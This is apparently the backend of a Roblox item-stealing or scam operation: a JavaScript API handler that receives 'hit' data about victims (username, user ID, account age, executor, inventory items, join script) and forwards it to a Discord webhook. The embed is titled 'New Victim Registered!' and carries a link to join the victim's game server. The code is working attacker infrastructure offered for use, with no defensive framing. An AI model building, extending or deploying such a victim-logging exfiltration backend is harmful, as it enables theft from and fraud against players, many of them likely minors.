import crypto from 'crypto';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { hitData } = req.body;

  if (!hitData) {
    return res.status(400).json({ success: false, error: 'Missing hitData' });
  }

  // Generate a unique session ID for this hit
  const sessionId = crypto.randomUUID();

  // Send the hit to Discord Webhook
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL || 'YOUR_WEBHOOK_URL_HERE'; 
  
  if (webhookUrl !== 'YOUR_WEBHOOK_URL_HERE') {
    try {
      // Build items string
      const itemsList = hitData.items && hitData.items.length > 0
        ? hitData.items.map(i => `• ${i.name} (${i.category}) x${i.amount}`).join('\n')
        : 'None';

      // Roblox deep-link join URL
      const joinUrl = hitData.placeId && hitData.jobId
        ? `https://www.roblox.com/games/${hitData.placeId}?gameInstanceId=${hitData.jobId}`
        : null;

      const embedFields = [
        { name: '👤 Username', value: `\`${hitData.username || 'Unknown'}\``, inline: true },
        { name: '🏷️ Display Name', value: `\`${hitData.displayName || 'Unknown'}\``, inline: true },
        { name: '🆔 Session ID', value: `\`${sessionId}\``, inline: false },
        { name: '🎮 Game', value: hitData.gameName || 'Unknown', inline: true },
        { name: '👥 Players', value: `${hitData.playerCount ?? '?'} / ${hitData.maxPlayers ?? '?'}`, inline: true },
        { name: '📅 Account Age', value: `${hitData.accountAge ?? '?'} days`, inline: true },
        { name: '🔧 Executor', value: hitData.executor || 'Unknown', inline: true },
        { name: '🪙 Roblox User ID', value: `\`${hitData.robloxUserId || 'Unknown'}\``, inline: true },
        { name: '🎒 Items', value: itemsList, inline: false },
        { name: '📜 Join Script', value: `\`\`\`lua\n${hitData.joinScript || 'N/A'}\`\`\``, inline: false },
      ];

      // Add join link button-style field if we have the data
      if (joinUrl) {
        embedFields.push({
          name: '🔗 Join Server',
          value: `[Click to join victim's server](${joinUrl})`,
          inline: false
        });
      }

      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: null,
          embeds: [{
            title: '🔥 New Victim Registered!',
            color: 0xFF4444,
            thumbnail: hitData.avatarUrl ? { url: hitData.avatarUrl } : undefined,
            fields: embedFields,
            footer: { text: `Place ID: ${hitData.placeId || 'N/A'} • Job ID: ${hitData.jobId || 'N/A'}` },
            timestamp: new Date().toISOString()
          }]
        })
      });
    } catch (e) {
      console.error('Webhook failed:', e);
    }
  }

  console.log(`[+] New hit registered! Session: ${sessionId} | Victim: ${hitData.username}`);

  return res.status(200).json({
    success: true,
    sessionId: sessionId
  });
}
